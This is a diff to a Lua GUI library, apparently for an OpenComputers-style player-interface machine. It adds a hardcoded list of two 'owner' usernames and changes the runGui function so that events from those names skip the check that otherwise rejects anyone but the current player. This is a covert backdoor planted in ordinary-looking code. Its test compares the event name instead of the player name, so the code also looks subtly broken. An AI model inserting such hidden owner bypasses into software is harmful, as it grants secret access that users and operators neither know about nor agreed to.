@@ -1215,7 +1215,19 @@ function gui.getYesNo(msg1, msg2, msg3, msgyes, msgno)
 end
 
 
- 
+local owners = {"LIMI_np", "gh0st040"}
+local function isOwner(name)
+    if not name then return false end
+
+    for _, owner in ipairs(owners) do
+        if owner == name then
+            return true
+        end
+    end
+
+    return false
+end
+
 function gui.runGui(guiID)
   if displayed == false then
     displayed = true
@@ -1257,7 +1269,11 @@ function gui.runGui(guiID)
 
   local e, _, x, y, button, _, pl = ev[1], ev[2], ev[3], ev[4], ev[5], ev[6] 
   if e == nil or gui.pimPlayer ~= ev[6] then
-    return false
+    if isOwner(e) then
+        -- continue
+    else
+        return false
+    end
   end
   for i = 1, #guiID do
     if guiID[i].type == "button" then
